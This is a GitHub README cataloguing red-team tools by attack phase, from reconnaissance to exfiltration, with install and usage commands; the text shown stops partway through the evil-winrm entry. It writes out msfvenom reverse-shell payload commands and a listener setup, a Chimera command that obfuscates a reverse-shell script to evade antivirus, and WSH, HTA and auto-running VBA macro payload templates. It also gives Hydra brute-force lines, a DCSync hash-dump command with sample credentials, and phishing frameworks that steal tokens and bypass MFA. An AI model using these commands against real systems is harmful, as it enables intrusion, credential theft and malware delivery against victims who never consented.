# RedTeam-Tools

<p align="center">
<img src="https://user-images.githubusercontent.com/100603074/210140513-273be5ad-89cb-4d3a-b72f-709f33928e63.png" height="300">
</p>

This github repository contains a collection of **75+** **tools** and **resources** that can be useful for **red teaming activities**. 

Some of the tools may be specifically designed for red teaming, while others are more general-purpose and can be adapted for use in a red teaming context.

> **Warning** 
> 
> *The materials in this repository are for informational and educational purposes only. They are not intended for use in any illegal activities.*

> **Note** 
> 
> *Hide Tool List headings with the arrow.*
> 
> *Click 🔙 to get back to the list.*

# Tool List

<details open>
    <summary><b>Reconnaissance</b> $\textcolor{gray}{\text{14 tools}}$</summary>
    <ul>
        <ul>
            <li><b><a href="#crtsh---httprobe---eyewitness">crt.sh -> httprobe -> EyeWitness</a></b><i> Automated domain screenshotting</i></li>
            <li><b><a href="#jsendpoints">jsendpoints</a></b><i> Extract page DOM links</i></li>
            <li><b><a href="#nuclei">nuclei</a></b><i> Vulnerability scanner</i></li>
            <li><b><a href="#certsniff">certSniff</a></b><i> Certificate transparency log keyword sniffer</i></li>
            <li><b><a href="#gobuster">gobuster</a></b><i> Website path brute force</i></li>
            <li><b><a href="#dnsrecon">dnsrecon</a></b><i> Enumerate DNS records</i></li>
            <li><b><a href="#shodanio">Shodan.io</a></b><i> Public facing system knowledge base</i></li>
            <li><b><a href="#aort">AORT (All in One Recon Tool)</a></b><i> Subdomain enumeration</i></li>
            <li><b><a href="#spoofcheck">spoofcheck</a></b><i> SPF/DMARC record checker</i></li>
            <li><b><a href="#awsbucketdump">AWSBucketDump</a></b><i> S3 bucket enumeration</i></li>
            <li><b><a href="#githarvester">GitHarvester</a></b><i> GitHub credential searcher</i></li>
            <li><b><a href="#trufflehog">truffleHog</a></b><i> GitHub credential scanner</i></li>
            <li><b><a href="#dismap">Dismap</a></b><i> Asset discovery/identification</i></li>
            <li><b><a href="#enum4linux">enum4linux</a></b><i> Windows/samba enumeration</i></li>
        </ul>
    </ul>
</details>

<details open>
    <summary><b>Resource Development</b> $\textcolor{gray}{\text{5 tools}}$</summary>
    <ul>
        <ul>
            <li><b><a href="#chimera">Chimera</a></b><i> PowerShell obfuscation</i></li>
            <li><b><a href="#msfvenom">msfvenom</a></b><i> Payload creation</i></li>
            <li><b><a href="#wsh">WSH</a></b><i> Wsh payload</i></li>
            <li><b><a href="#hta">HTA</a></b><i> Hta  payload</i></li>
            <li><b><a href="#vba">VBA</a></b><i> Vba  payload</i></li>
        </ul>
    </ul>
</details>

<details open>
    <summary><b>Initial Access</b> $\textcolor{gray}{\text{6 tools}}$</summary>
    <ul>
        <ul>
            <li><b><a href="#bash-bunny">Bash Bunny</a></b><i> USB attack tool</i></li>
            <li><b><a href="#evilgophish">EvilGoPhish</a></b><i> Phishing campaign framework</i></li>
            <li><b><a href="#social-engineer-toolkit-set">The Social-Engineer Toolkit</a></b><i> Phishing campaign framework</i></li>
            <li><b><a href="#hydra">Hydra</a></b><i> Brute force tool</i></li>
            <li><b><a href="#squarephish">SquarePhish</a></b><i> OAuth/QR code phishing framework</i></li>
            <li><b><a href="#king-phisher">King Phisher</a></b><i> Phishing campaign framework</i></li>
        </ul>
    </ul>
</details>

<details open>
    <summary><b>Execution</b> $\textcolor{gray}{\text{8 tools}}$</summary>
    <ul>
        <ul>
            <li><b><a href="#responder">Responder</a></b><i> LLMNR, NBT-NS and MDNS poisoner</i></li>
            <li><b><a href="#secretsdump">secretsdump</a></b><i> Remote hash dumper</i></li>
            <li><b><a href="#evil-winrm">evil-winrm</a></b><i> WinRM shell</i></li>
            <li><b><a href="#donut">Donut</a></b><i> In-memory .NET execution</i></li>
            <li><b><a href="#macro_pack">Macro_pack</a></b><i> Macro obfuscation</i></li>
            <li><b><a href="#powersploit">PowerSploit</a></b><i> PowerShell script suite</i></li>
            <li><b><a href="#rubeus">Rubeus</a></b><i> Active directory hack tool</i></li>
            <li><b><a href="#sharpup">SharpUp</a></b><i> Windows vulnerability identifier</i></li>
        </ul>
    </ul>
</details>

<details open>
    <summary><b>Persistence</b> $\textcolor{gray}{\text{3 tools}}$</summary>
    <ul>
        <ul>
            <li><b><a href="#impacket">Impacket</a></b><i> Python script suite</i></li>
            <li><b><a href="#empire">Empire</a></b><i> Post-exploitation framework</i></li>
            <li><b><a href="#sharpersist">SharPersist</a></b><i> Windows persistence toolkit</i></li>
        </ul>
    </ul>
</details>

<details open>
    <summary><b>Privilege Escalation</b> $\textcolor{gray}{\text{8 tools}}$</summary>
    <ul>
        <ul>
            <li><b><a href="#linpeas">LinPEAS</a></b><i> Linux privilege escalation</i></li>
            <li><b><a href="#winpeas">WinPEAS</a></b><i> Windows privilege escalation</i></li>
            <li><b><a href="#linux-smart-enumeration">linux-smart-enumeration</a></b><i> Linux privilege escalation</i></li>
            <li><b><a href="#certify">Certify</a></b><i> Active directory privilege escalation</i></li>
            <li><b><a href="#get-gpppassword">Get-GPPPassword</a></b><i> Windows password extraction</i></li>
	    <li><b><a href="#sherlock">Sherlock</a></b><i> PowerShell privilege escalation tool</i></li>
	    <li><b><a href="#watson">Watson</a></b><i> Windows privilege escalation tool</i></li>
	    <li><b><a href="#impulsivedllhijack">ImpulsiveDLLHijack</a></b><i> DLL Hijack tool</i></li>
        </ul>
    </ul>
</details>

<details open>
    <summary><b>Defense Evasion</b> $\textcolor{gray}{\text{2 tools}}$</summary>
    <ul>
        <ul>
            <li><b><a href="#invoke-obfuscation">Invoke-Obfuscation</a></b><i> Script obfuscator</i></li>
	    <li><b><a href="#veil">Veil</a></b><i> Metasploit payload obfuscator</i></li>
        </ul>
    </ul>
</details>

<details open>
    <summary><b>Credential Access</b> $\textcolor{gray}{\text{5 tools}}$</summary>
    <ul>
        <ul>
            <li><b><a href="#mimikatz">Mimikatz</a></b><i> Windows credential extractor</i></li>
            <li><b><a href="#lazagne">LaZagne</a></b><i> Local password extractor</i></li>
            <li><b><a href="#hashcat">hashcat</a></b><i> Password hash cracking</i></li>
            <li><b><a href="#john-the-ripper">John the Ripper</a></b><i> Password hash cracking</i></li>
	    <li><b><a href="#scomdecrypt">SCOMDecrypt</a></b><i> SCOM Credential Decryption Tool</i></li>
        </ul>
    </ul>
</details>

<details open>
    <summary><b>Discovery</b> $\textcolor{gray}{\text{4 tools}}$</summary>
    <ul>
        <ul>
            <li><b><a href="#pcredz">PCredz</a></b><i> Credential discovery PCAP/live interface</i></li>
            <li><b><a href="#pingcastle">PingCastle</a></b><i> Active directory assessor</i></li>
	    <li><b><a href="#seatbelt">Seatbelt</a></b><i> Local vulnerability scanner</i></li>
	    <li><b><a href="#adrecon">ADRecon</a></b><i> Active directory recon</i></li>
        </ul>
    </ul>
</details>

<details open>
    <summary><b>Lateral Movement</b> $\textcolor{gray}{\text{8 tools}}$</summary>
    <ul>
        <ul>
            <li><b><a href="#crackmapexec">crackmapexec</a></b><i> Windows/Active directory lateral movement toolkit</i></li>
            <li><b><a href="#wmiops">WMIOps</a></b><i> WMI remote commands</i></li>
            <li><b><a href="#powerlessshell">PowerLessShell</a></b><i> Remote PowerShell without PowerShell</i></li>
            <li><b><a href="#psexec">PsExec</a></b><i> Light-weight telnet-replacement</i></li>
            <li><b><a href="#enabling-rdp">Enabling RDP</a></b><i> Windows RDP enable command</i></li>
            <li><b><a href="#upgrading-shell-to-meterpreter">Upgrading shell to meterpreter</a></b><i> Reverse shell improvement</i></li>
            <li><b><a href="#forwarding-ports">Forwarding Ports</a></b><i> Local port forward command</i></li>
            <li><b><a href="#jenkins-reverse-shell">Jenkins reverse shell</a></b><i> Jenkins shell command</i></li>
        </ul>
    </ul>
</details>

<details open>
    <summary><b>Collection</b> $\textcolor{gray}{\text{2 tools}}$</summary>
    <ul>
        <ul>
            <li><b><a href="#bloodhound">BloodHound</a></b><i> Active directory visualisation</i></li>
            <li><b><a href="#snaffler">Snaffler</a></b><i> Active directory credential collector</i></li>
        </ul>
    </ul>
</details>

<details open>
    <summary><b>Command and Control</b> $\textcolor{gray}{\text{6 tools}}$</summary>
    <ul>
        <ul>
            <li><b><a href="#havoc">Havoc</a></b><i> Command and control framework</i></li>
    	    <li><b><a href="#covenant">Covenant</a></b><i> Command and control framework (.NET)</i></li>
    	    <li><b><a href="#merlin">Merlin</a></b><i> Command and control framework (Golang)</i></li>
    	    <li><b><a href="#metasploit-framework">Metasploit Framework</a></b><i> Command and control framework (Ruby)</i></li>
    	    <li><b><a href="#pupy">Pupy</a></b><i> Command and control framework (Python)</i></li>
    	    <li><b><a href="#brute-ratel">Brute Ratel</a></b><i> Command and control framework ($$$)</i></li>
        </ul>
    </ul>
</details>

<details open>
    <summary><b>Exfiltration</b> $\textcolor{gray}{\text{5 tools}}$</summary>
    <ul>
        <ul>
	    <li><b><a href="#dnscat2">Dnscat2</a></b><i> C2 via DNS tunneling</i></li>
	    <li><b><a href="#cloakify">Cloakify</a></b><i> Data transformation for exfiltration</i></li>
            <li><b><a href="#pyexfil">PyExfil</a></b><i> Data exfiltration PoC</i></li>
            <li><b><a href="#powershell-rat">Powershell RAT</a></b><i> Python based backdoor</i></li>
            <li><b><a href="#gd-thief">GD-Thief</a></b><i> Google drive exfiltration</i></li>
        </ul>
    </ul>
</details>

<details open>
    <summary><b>Impact</b> $\textcolor{gray}{\text{1 tools}}$</summary>
    <ul>
        <ul>
            <li><b><a href="#slowloris">SlowLoris</a></b><i> Simple denial of service</i></li>
        </ul>
    </ul>
</details>
    
Reconnaissance
====================

### [🔙](#tool-list)crt.sh -> httprobe -> EyeWitness

I have put together a bash one-liner that: 
- Passively collects a list of subdomains from certificate associations ([crt.sh](https://crt.sh/))
- Actively requests each subdomain to verify it's existence ([httprobe](https://github.com/tomnomnom/httprobe))
- Actively screenshots each subdomain for manual review ([EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness))

**Usage:** 

```bash
domain=DOMAIN_COM;rand=$RANDOM;curl -fsSL "https://crt.sh/?q=${domain}" | pup 'td text{}' | grep "${domain}" | sort -n | uniq | httprobe > /tmp/enum_tmp_${rand}.txt; python3 /usr/share/eyewitness/EyeWitness.py -f /tmp/enum_tmp_${rand}.txt --web
```

*Note: You must have [httprobe](https://github.com/tomnomnom/httprobe), [pup](https://github.com/EricChiang/pup) and [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness) installed and change 'DOMAIN_COM' to the target domain. You are able to run this script concurrently in terminal windows if you have multiple target root domains*

![image](https://user-images.githubusercontent.com/100603074/192104474-5836138a-4a61-44fd-b3e3-b2a908c2928e.png)

![image](https://user-images.githubusercontent.com/100603074/192104501-e038aff8-1e51-4cc3-a286-54e93408ed4e.png)

### [🔙](#tool-list)[jsendpoints](https://twitter.com/renniepak/status/1602620834463588352)

A JavaScript bookmarklet for extracting all webpage endpoint links on a page.

Created by [@renniepak](https://twitter.com/renniepak), this JavaScript code snippet can be used to extract all endpoints (starting with /) from the current webpage DOM including all external script sources embedded on the webpage.

```javascript
javascript:(function(){var scripts=document.getElementsByTagName("script"),regex=/(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))/g;const results=new Set;for(var i=0;i<scripts.length;i++){var t=scripts[i].src;""!=t&&fetch(t).then(function(t){return t.text()}).then(function(t){var e=t.matchAll(regex);for(let r of e)results.add(r[0])}).catch(function(t){console.log("An error occurred: ",t)})}var pageContent=document.documentElement.outerHTML,matches=pageContent.matchAll(regex);for(const match of matches)results.add(match[0]);function writeResults(){results.forEach(function(t){document.write(t+"<br>")})}setTimeout(writeResults,3e3);})();
```

**Usage (Bookmarklet)** 

Create a bookmarklet...

- `Right click your bookmark bar`
- `Click 'Add Page'`
- `Paste the above Javascript in the 'url' box`
- `Click 'Save'`

...then visit the victim page in the browser and click the bookmarklet.

![image](https://user-images.githubusercontent.com/100603074/207563211-6c69711a-f7e7-4451-862b-80c9849df7fe.png)

**Usage (Console)** 

Paste the above Javascript into the console window `F12` and press enter. 

![image](https://user-images.githubusercontent.com/100603074/207563598-d70171b5-823e-491e-a6d5-8657af28b0e5.png)

### [🔙](#tool-list)[nuclei](https://github.com/projectdiscovery/nuclei)

Fast vulnerability scanner that uses .yaml templates to search for specific issues.

**Install:** 

```bash
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
```

**Usage:** 

```bash
cat domains.txt | nuclei -t /PATH/nuclei-templates/
```

![image](https://user-images.githubusercontent.com/100603074/205439027-2afe4ef8-fc7a-410d-934f-f8d325a8176e.png)

### [🔙](#tool-list)[certSniff](https://github.com/A-poc/certSniff)

certSniff is a Certificate Transparency logs keyword watcher I wrote in Python. It uses the certstream library to watch for certificate creation logs that contain keywords, defined in a file.

You can set this running with several keywords relating to your victim domain, any certificate creations will be recorded and may lead to the discovery of domains you were previously unaware of.

**Install:** 

```bash
git clone https://github.com/A-poc/certSniff;cd certSniff/;pip install -r requirements.txt
```

**Usage:** 

```python
python3 certSniff.py -f example.txt
```

![image](https://user-images.githubusercontent.com/100603074/206023792-ef251912-00c0-48e1-8691-71438cf7dd11.png)

### [🔙](#tool-list)[gobuster](https://www.kali.org/tools/gobuster/)

Nice tool for brute forcing file/folder paths on a victim website.

**Install:** 

```bash
sudo apt install gobuster
```

**Usage:** 

```bash
gobuster dir -u "https://google.com" -w /usr/share/wordlists/dirb/big.txt --wildcard -b 301,401,403,404,500 -t 20
```

![image](https://user-images.githubusercontent.com/100603074/192146594-86f04a85-fce3-4c4c-bcd6-2bf6a6222241.png)


### [🔙](#tool-list)[dnsrecon](https://www.kali.org/tools/dnsrecon/#dnsrecon)

dnsrecon is a pyhton tool for enumerating DNS records (MX, SOA, NS, A, AAAA, SPF and TXT) and can provide a number of new associated victim hosts to pivot into from a single domain search.

**Install:** 

```bash
sudo apt install dnsrecon
```

**Usage:** 

```bash
dnsrecon -d google.com
```

![image](https://user-images.githubusercontent.com/100603074/191689049-624db340-8adb-4a97-be8d-b7177f409a8b.png)

### [🔙](#tool-list)[shodan.io](https://www.shodan.io/dashboard)

Shodan crawls public infrastructure and displays it in a searchable format. Using a company name, domain name, IP address it is possible to discover potentially vulnerable systems relating to your target via shodan.

![image](https://user-images.githubusercontent.com/100603074/191689282-70f99fe9-aa08-4cd3-b881-764eface8546.png)

### [🔙](#tool-list)[AORT](https://github.com/D3Ext/AORT)

Tool for enumerating subdomains, enumerating DNS, WAF detection, WHOIS, port scan, wayback machine, email harvesting.

**Install:** 

```bash
git clone https://github.com/D3Ext/AORT; cd AORT; pip3 install -r requirements.txt
```

**Usage:** 

```python
python3 AORT.py -d google.com
```

![image](https://user-images.githubusercontent.com/100603074/192070398-aae0217d-69c4-460b-ae4c-51b045551268.png)

### [🔙](#tool-list)[spoofcheck](https://github.com/BishopFox/spoofcheck)

A program that checks if a domain can be spoofed from. The program checks SPF and DMARC records for weak configurations that allow spoofing. Additionally it will alert if the domain has DMARC configuration that sends mail or HTTP requests on failed SPF/DKIM emails.

Domains are spoofable if any of the following conditions are met:

- Lack of an SPF or DMARC record
- SPF record never specifies `~all` or `-all`
- DMARC policy is set to `p=none` or is nonexistent

**Install:**

```bash
git clone https://github.com/BishopFox/spoofcheck; cd spoofcheck; pip install -r requirements.txt
```

**Usage:** 

```bash
./spoofcheck.py [DOMAIN]
```

![image](https://user-images.githubusercontent.com/100603074/208209744-dfff6dd6-f53c-41a2-b3b7-bfc6bfb9b521.png)

### [🔙](#tool-list)[AWSBucketDump](https://github.com/jordanpotti/AWSBucketDump)

AWSBucketDump is a tool to quickly enumerate AWS S3 buckets to look for interesting files. It's similar to a subdomain bruteforcer but is made specifically for S3 buckets and also has some extra features that allow you to grep for files, as well as download interesting files.

**Install:**

```
git clone https://github.com/jordanpotti/AWSBucketDump; cd AWSBucketDump; pip install -r requirements.txt
```

**Usage:** 

```
usage: AWSBucketDump.py [-h] [-D] [-t THREADS] -l HOSTLIST [-g GREPWORDS] [-m MAXSIZE]

optional arguments:
  -h, --help    show this help message and exit
  -D            Download files. This requires significant diskspace
  -d            If set to 1 or True, create directories for each host w/ results
  -t THREADS    number of threads
  -l HOSTLIST
  -g GREPWORDS  Provide a wordlist to grep for
  -m MAXSIZE    Maximum file size to download.

 python AWSBucketDump.py -l BucketNames.txt -g interesting_Keywords.txt -D -m 500000 -d 1
```

### [🔙](#tool-list)[GitHarvester](https://github.com/metac0rtex/GitHarvester)

Nice tool for finding information from GitHub with regex, with the ability to search specific GitHub users and/or projects.

**Install:**

```
git clone https://github.com/metac0rtex/GitHarvester; cd GitHarvester
```

**Usage:** 

```
./githarvester.py
```

### [🔙](#tool-list)[truffleHog](https://github.com/dxa4481/truffleHog)

TruffleHog is a tool that scans git repositories and looks for high-entropy strings and patterns that may indicate the presence of secrets, such as passwords and API keys. With TruffleHog, you can quickly and easily find sensitive information that may have been accidentally committed and pushed to a repository.

**Install (Binaries):** [Link](https://github.com/trufflesecurity/trufflehog/releases)

**Install (Go):**

```
git clone https://github.com/trufflesecurity/trufflehog.git; cd trufflehog; go install
```

**Usage:** 

```
trufflehog https://github.com/trufflesecurity/test_keys
```

![image](https://user-images.githubusercontent.com/100603074/208212273-137cb6ef-b0e6-42f7-8fd3-ac6a5cfe6a40.png)

### [🔙](#tool-list)[Dismap](https://github.com/zhzyker/dismap)

Dismap is an asset discovery and identification tool. It can quickly identify protocols and fingerprint information such as web/tcp/udp, locate asset types, and is suitable for internal and external networks.

Dismap has a complete fingerprint rule base, currently including tcp/udp/tls protocol fingerprints and 4500+ web fingerprint rules, which can identify favicon, body, header, etc.

**Install:** 

Dismap is a binary file for Linux, MacOS, and Windows. Go to [Release](https://github.com/zhzyker/dismap/releases) to download the corresponding version to run:

```bash
# Linux or MacOS
chmod +x dismap-0.3-linux-amd64
./dismap-0.3-linux-amd64 -h

# Windows
dismap-0.3-windows-amd64.exe -h
```

**Usage:** 

```bash
# Scan 192.168.1.1 subnet
./dismap -i 192.168.1.1/24

# Scan, output to result.txt and json output to result.json
./dismap -i 192.168.1.1/24 -o result.txt -j result.json

# Scan, Not use ICMP/PING to detect surviving hosts, timeout 10 seconds
./dismap -i 192.168.1.1/24 --np --timeout 10

# Scan, Number of concurrent threads 1000
./dismap -i 192.168.1.1/24 -t 1000
```

![image](https://user-images.githubusercontent.com/100603074/210266012-ba3fadf8-5021-4690-a6d7-eda78bd5d50a.png)

*Image used from https://github.com/zhzyker/dismap*

### [🔙](#tool-list)[enum4linux](https://github.com/CiscoCXSecurity/enum4linux)

A tool for enumerating information from Windows and Samba systems.

It can be used to gather a wide range of information, including:

- Domain and domain controller information
- Local user and group information
- Shares and share permissions
- Security policies
- Active Directory information

**Install: (Apt)** 

```bash
sudo apt install enum4linux
```

**Install: (Git)** 

```bash
git clone https://github.com/CiscoCXSecurity/enum4linux
cd enum4linux
```

**Usage:** 

```bash
# 'Do everything'
enum4linux.pl -a 192.168.2.55

# Obtain list of usernames (RestrictAnonymous = 0)
enum4linux.pl -U 192.168.2.55

# Obtain list of usernames (using authentication)
enum4linux.pl -u administrator -p password -U 192.168.2.55

# Get a list of groups and their members
enum4linux.pl -G 192.168.2.55

# Verbose scan 
enum4linux.pl -v 192.168.2.55
```

Full usage information can be found in this [blog](https://labs.portcullis.co.uk/tools/enum4linux/).

![image](https://user-images.githubusercontent.com/100603074/210266058-bf05f272-ff05-4e97-97e9-5d11b7ae01eb.png)

*Image used from https://allabouttesting.org/samba-enumeration-for-penetration-testing-short-tutorial/*

Resource Development
====================

### [🔙](#tool-list)[Chimera](https://github.com/tokyoneon/Chimera)

Chimera is a PowerShell obfuscation script designed to bypass AMSI and antivirus solutions. It digests malicious PS1's known to trigger AV and uses string substitution and variable concatenation to evade common detection signatures.

**Install:** 

```bash
sudo apt-get update && sudo apt-get install -Vy sed xxd libc-bin curl jq perl gawk grep coreutils git
sudo git clone https://github.com/tokyoneon/chimera /opt/chimera
sudo chown $USER:$USER -R /opt/chimera/; cd /opt/chimera/
sudo chmod +x chimera.sh; ./chimera.sh --help
```

**Usage:** 

```bash
./chimera.sh -f shells/Invoke-PowerShellTcp.ps1 -l 3 -o /tmp/chimera.ps1 -v -t powershell,windows,\
copyright -c -i -h -s length,get-location,ascii,stop,close,getstream -b new-object,reverse,\
invoke-expression,out-string,write-error -j -g -k -r -p
```

![image](https://user-images.githubusercontent.com/100603074/209867736-5c35cec0-9227-4f18-a439-a5c954342818.png)

### [🔙](#tool-list)[msfvenom](https://www.offensive-security.com/metasploit-unleashed/Msfvenom/)

Msfvenom allows the creation of payloads for various operating systems in a wide range of formats. It also supports obfuscation of payloads for AV bypass.

**Set Up Listener**

```shell
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST your-ip 
set LPORT listening-port 
run
```

#### Msfvenom Commands

**PHP:** 

```bash
msfvenom -p php/meterpreter/reverse_tcp lhost =192.168.0.9 lport=1234 R
```

**Windows:** 

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```

**Linux:** 

```bash
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
```

**Java:** 

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
```

**HTA:** 

```bash
msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f hta-psh > shell.hta
```

![image](https://user-images.githubusercontent.com/100603074/192070870-2e65fc9f-6534-42e2-af27-9d8b54a82f0b.png)

### [🔙](#tool-list)WSH

**Creating payload:** 

```vbs
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```

**Execute:** 

```bash
wscript payload.vbs
cscript.exe payload.vbs
wscript /e:VBScript payload.txt //If .vbs files are blacklisted
```

### [🔙](#tool-list)HTA

**Creating payload:**

```html
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

**Execute:** Run file

### [🔙](#tool-list)VBA

**Creating payload:**

```python
Sub calc()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```

**Execute:** Set function to Auto_Open() in macro enabled document

Initial Access
====================

### [🔙](#tool-list)[Bash Bunny](https://shop.hak5.org/products/bash-bunny)

The Bash Bunny is a physical USB attack tool and multi-function payload delivery system. It is designed to be plugged into a computer's USB port and can be programmed to perform a variety of functions, including manipulating and exfiltrating data, installing malware, and bypassing security measures.

[hackinglab: Bash Bunny – Guide](https://hackinglab.cz/en/blog/bash-bunny-guide/)

[Hak5 Documentation](https://docs.hak5.org/bash-bunny/)

[Nice Payload Repo](https://github.com/hak5/bashbunny-payloads)

[Product Page](https://hak5.org/products/bash-bunny)

![image](https://user-images.githubusercontent.com/100603074/209868292-cc02ce20-7d8e-4019-b953-7082fb0eb828.png)

### [🔙](#tool-list)[EvilGoPhish](https://github.com/fin3ss3g0d/evilgophish)

evilginx2 + gophish. (GoPhish) Gophish is a powerful, open-source phishing framework that makes it easy to test your organization's exposure to phishing. (evilginx2) Standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication

**Install:** 

```bash
git clone https://github.com/fin3ss3g0d/evilgophish
```

**Usage:**

```
Usage:
./setup <root domain> <subdomain(s)> <root domain bool> <redirect url> <feed bool> <rid replacement> <blacklist bool>
 - root domain                     - the root domain to be used for the campaign
 - subdomains                      - a space separated list of evilginx2 subdomains, can be one if only one
 - root domain bool                - true or false to proxy root domain to evilginx2
 - redirect url                    - URL to redirect unauthorized Apache requests
 - feed bool                       - true or false if you plan to use the live feed
 - rid replacement                 - replace the gophish default "rid" in phishing URLs with this value
 - blacklist bool                  - true or false to use Apache blacklist
Example:
  ./setup.sh example.com "accounts myaccount" false https://redirect.com/ true user_id false
```

![image](https://user-images.githubusercontent.com/100603074/191007680-890acda1-72ec-429e-9c91-b2cae55d7189.png)

### [🔙](#tool-list)[Social Engineer Toolkit (SET)](https://github.com/IO1337/social-engineering-toolkit)

This framework is great for creating campaigns for initial access, 'SET has a number of custom attack vectors that allow you to make a believable attack quickly'.

**Install:** 

```bash
git clone https://github.com/IO1337/social-engineering-toolkit; cd set; python setup.py install
```

**Usage:** 

```bash
python3 setoolkit
```

![image](https://user-images.githubusercontent.com/100603074/191690233-e1f4255a-514e-4887-94da-b8a3396025f0.png)

### [🔙](#tool-list)[Hydra](https://github.com/vanhauser-thc/thc-hydra)

Nice tool for logon brute force attacks. Can bf a number of services including SSH, FTP, TELNET, HTTP etc.

**Install:** 

```bash
sudo apt install hydra
```

**Usage:**

```bash
hydra -L USER.TXT -P PASS.TXT 1.1.1.1 http-post-form "login.php:username-^USER^&password=^PASS^:Error"
hydra -L USER.TXT -P PASS.TXT 1.1.1.1 ssh
```

![image](https://user-images.githubusercontent.com/100603074/193459614-365876d5-09da-4f29-b850-0480944f0097.png)

### [🔙](#tool-list)[SquarePhish](https://github.com/secureworks/squarephish)

SquarePhish is an advanced phishing tool that uses a technique combining  OAuth Device code authentication flow and QR codes (See [PhishInSuits](https://github.com/secureworks/PhishInSuits) for more about OAuth Device Code flow for phishing attacks).

Attack Steps:

- Send malicious QR code to victim
- Victim scans QR code with mobile device
- Victim directed to attacker controlled server (Triggering OAuth Device Code authentication flow process)
- Victim emailed MFA code (Triggering OAuth Device Code flow 15 minute timer)
- Attacker polls for authentication
- Victim enters code into legit Microsoft website
- Attacker saves authentication token

**Install:** 

```bash
git clone https://github.com/secureworks/squarephish; cd squarephish; pip install -r requirements.txt
```

**Note:** *Before using either module, update the required information in the settings.config file noted with `Required`.*

**Usage (Email Module):**

```
usage: squish.py email [-h] [-c CONFIG] [--debug] [-e EMAIL]

optional arguments:
  -h, --help            show this help message and exit

  -c CONFIG, --config CONFIG
                        squarephish config file [Default: settings.config]

  --debug               enable server debugging

  -e EMAIL, --email EMAIL
                        victim email address to send initial QR code email to
```

**Usage (Server Module):**

```
usage: squish.py server [-h] [-c CONFIG] [--debug]

optional arguments:
  -h, --help            show this help message and exit

  -c CONFIG, --config CONFIG
                        squarephish config file [Default: settings.config]

  --debug               enable server debugging
```

![image](https://user-images.githubusercontent.com/100603074/208217359-70e3ebd4-5cbf-40b9-9e4b-ca1608e4422f.png)
 

### [🔙](#tool-list)[King Phisher](https://github.com/securestate/king-phisher)

King Phisher is a tool that allows attackers to create and send phishing emails to victims to obtain sensitive information.

It includes features like customizable templates, campaign management, and email sending capabilities, making it a powerful and easy-to-use tool for carrying out phishing attacks. With King Phisher, atackers can target individuals or organizations with targeted and convincing phishing emails, increasing the chances of success in their attacks.

**Install (Linux - Client & Server):** 

```bash
wget -q https://github.com/securestate/king-phisher/raw/master/tools/install.sh && \
sudo bash ./install.sh
```

**Usage:**

Once King Phisher has been installed please follow the [wiki page](https://github.com/rsmusllp/king-phisher/wiki/Getting-Started) to setup SSH, Database config, SMTP server etc.

![image](https://user-images.githubusercontent.com/100603074/208217377-a6d36613-4ffe-486d-a630-99ed1bb7ed2d.png)

Execution
====================

### [🔙](#tool-list)[Responder](https://github.com/SpiderLabs/Responder)

Responder is a tool for poisoning the LLMNR and NBT-NS protocols on a network, to allow for credential capture and arbitrary code execution.

The LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) protocols are used by Windows systems to resolve hostnames to IP addresses on a local network. If a hostname cannot be resolved using these protocols, the system will broadcast a request for the hostname to the local network. 

Responder listens for these broadcasts and responds with a fake IP address, tricking the requesting system into sending its credentials to the attacker.

**Install:** 

```bash
git clone https://github.com/SpiderLabs/Responder#usage
cd Responder
```

**Usage:** 

```bash
# Running the tool
./Responder.py [options]

# Typical usage
./Responder.py -I eth0 -wrf
```

Full usage information can be found [here](https://github.com/SpiderLabs/Responder#usage).

![image](https://user-images.githubusercontent.com/100603074/210266150-b9cbd4a0-d07b-435a-8fa9-bc0b88d2c6ae.png)

*Image used from https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/*

### [🔙](#tool-list)[secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)

A utility that is part of the Impacket library that can be used to extract password hashes and other secrets from a Windows system. 

It does this by interacting with the Security Account Manager (SAM) database on the system and extracting the hashed passwords and other information, such as:

- Password hashes for local accounts
- Kerberos tickets and keys
- LSA Secrets

**Install:** 

```bash
python3 -m pip install impacket
```

**Usage:** 

```bash
# Extract NTLM hashes with local files
secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL

# DCSync attack and dump the NTLM hashes of all domain users.
secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
```

![image](https://user-images.githubusercontent.com/100603074/210266110-8f60d6e8-009a-4dea-9e33-8a712aeaf2ac.png)

*Image used from https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#secretsdumppy*

### [🔙](#tool-list)[evil-winrm](https://github.com/Hackplayers/evil-winrm)

Evil-WinRM is a tool that provides a command line interface for Windows Remote Management (WinRM: *A service that allows administrators to remotely execute commands on a Windows machine*).

Evil-WinRM allows an attacker to remotely connect to a Windows machine using WinRM and execute arbitrary commands.

Some features include:

- Loading in memory Powershell scripts
- Loading in memory dll files bypassing some AVs
- Loading x64 payloads
- Pass-the-hash support
- Uploading and downloading local and remote files


**Install: (Git)** 

```bash
sudo gem install winrm winrm-fs stringio logger fileutils
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
```

**Install: (Ruby gem)** 

```bash
gem install evil-winrm
```

Alternative installation instructions can be found [here](https://github.com/Hackplayers/evil-winrm#installation--quick-start-4-methods).

**Usage:** 

```bash
# Connect to 192.168.1.100 as Administrator with custom exe/ps1 download folder locations
